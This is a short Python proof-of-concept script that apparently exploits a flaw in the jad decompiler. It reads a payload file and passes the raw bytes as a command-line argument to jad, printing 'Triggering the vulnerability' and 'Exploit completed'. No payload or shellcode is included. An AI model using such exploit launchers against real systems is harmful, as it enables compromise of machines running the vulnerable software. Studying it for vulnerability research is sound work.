#!/usr/bin/env python3

import sys
import subprocess

if(len(sys.argv) != 2):
	print('[%] Usage: python3 ' + sys.argv[0] + ' <in file>')
	exit()

try:
	fp = open(sys.argv[1], 'rb')
	payload = fp.read()
	fp.close()
except:
	print('[-] Something went wrong while reading the specified file.')
	exit()

print('[*] Triggering the vulnerability with: ' + sys.argv[1])

subprocess.call(['jad', payload])

print('[+] Exploit completed')
